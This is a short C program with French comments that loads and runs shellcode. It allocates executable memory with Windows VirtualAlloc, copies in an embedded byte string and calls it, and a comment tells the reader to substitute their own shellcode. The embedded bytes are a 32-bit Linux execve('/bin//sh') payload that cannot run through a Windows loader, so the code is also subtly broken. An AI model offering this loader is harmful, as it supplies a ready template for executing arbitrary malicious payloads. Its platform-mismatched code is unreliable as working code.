#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

int main() {
    // Shellcode à exécuter (remplacez par votre propre shellcode)
    unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

    // Allocation de mémoire pour le shellcode
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL) {
        printf("VirtualAlloc failed\n");
        return 1;
    }

    // Copie du shellcode dans la mémoire allouée
    memcpy(exec, shellcode, sizeof(shellcode));

    // Exécution du shellcode
    ((void(*)())exec)();

    return 0;
}